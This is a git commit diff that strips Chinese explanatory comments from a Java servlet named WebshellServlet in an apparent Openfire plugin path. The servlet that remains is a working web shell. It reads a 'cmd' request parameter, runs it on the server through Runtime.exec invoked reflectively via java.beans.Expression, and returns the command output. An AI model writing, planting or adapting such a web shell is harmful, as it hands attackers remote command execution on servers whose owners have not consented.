33092eac19635a4645bd82b7e8058ee2a13c114b
phith0n <phith0n.ph2f@gmail.com>
2023-06-18 19:48:58 +0800

    remove unused comment

--- src/java/org/jivesoftware/openfire/fastpath/WebshellServlet.java
+++ src/java/org/jivesoftware/openfire/fastpath/WebshellServlet.java
@@ -17,17 +17,13 @@ public class WebshellServlet extends HttpServlet {
             res.setContentType("text/plain");
             String cmd = req.getParameter("cmd");
             Expression expr = new Expression(Runtime.getRuntime(), "exec", new Object[]{cmd});
-            //返回值是一个process的object
             Process process = (Process) expr.getValue();
             InputStream in = process.getInputStream();
 
             StringBuilder sb = new StringBuilder();
-            //回显的返回结果是一个流，用 InputStreamReader 来读取
             InputStreamReader resultReader = new InputStreamReader(in);
-            //再包一层BufferedReader读字符串
             BufferedReader stdInput = new BufferedReader(resultReader);
             String s;
-            //BufferedReader的readline逐行字符串
             while ((s = stdInput.readLine()) != null) {
                 sb.append(s).append("\n");
             }
